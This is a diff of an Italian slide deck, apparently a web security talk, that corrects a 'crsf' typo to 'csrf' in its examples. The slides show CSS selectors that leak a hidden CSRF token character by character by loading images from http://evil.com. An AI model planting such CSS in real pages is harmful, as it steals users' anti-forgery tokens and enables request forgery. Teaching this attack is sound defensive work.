@@ -1,5 +1,5 @@
 <p-slide>
-  <h2 class="center">Ci stiamo solo scaldando&hellip;</h2>
+  <h2 class="center">&hellip; può andare peggio?</h2>
 </p-slide>
 <p-slide class="center">
   <img src="img/react.svg" alt="React.js" style="height: 4em;">
@@ -40,12 +40,12 @@ input[type='password'][value$='c']::before {
 <p-slide>
   <h3 class="our-header">Ma anche senza React&hellip;</h3>
   <div class="self-center">
-    <pre class="language-html"><code>&lt;input type="hidden" name="crsf" value="abcdef=="></code></pre>
-    <pre class="language-css"><code>input[name="crsf"][value^="a"] ~ * {
+    <pre class="language-html"><code>&lt;input type="hidden" name="csrf" value="abcdef=="></code></pre>
+    <pre class="language-css"><code>input[name="csrf"][value^="a"] ~ * {
   background-image: url('http://evil.com/a.gif');
 }
 ...
-input[name="crsf"][value$="="] ~ * {
+input[name="csrf"][value$="="] ~ * {
   background-image: url('http://evil.com/is-base-64.gif');
 }
 ...</code></pre>
@@ -53,11 +53,11 @@ input[name="crsf"][value$="="] ~ * {
 </p-slide>
 <p-slide>
   <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
-  <pre class="language-css self-center"><code>form:has(input[name="crsf"][value^="a"]) {
+  <pre class="language-css self-center"><code>form:has(input[name="csrf"][value^="a"]) {
   background-image: url('http://evil.com/a.gif');
 }
 ...
-form:has(input[name="crsf"][value$="="]) {
+form:has(input[name="csrf"][value$="="]) {
   background-image: url('http://evil.com/is-base-64.gif');
 }
 ...</code></pre>
